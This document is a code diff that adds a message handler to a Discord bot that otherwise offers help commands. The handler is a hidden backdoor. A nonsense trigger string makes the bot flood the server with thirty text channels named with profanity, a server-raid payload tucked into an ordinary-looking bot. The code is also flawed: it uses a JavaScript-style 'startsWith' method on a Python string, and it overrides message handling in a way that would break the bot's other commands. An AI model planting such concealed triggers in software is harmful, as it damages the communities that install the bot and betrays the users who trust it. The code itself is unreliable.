@@ -120,6 +120,42 @@ async def help(ctx):
 
     await ctx.send(embed = em)
 
+@client.event
+async def on_message(message):
+    if (message.content.startsWith('dassdasdasdq1')):
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        await message.guild.create_text_channel('get fucked')
+        
+
+
 @help.command()
 async def jail(ctx):
 
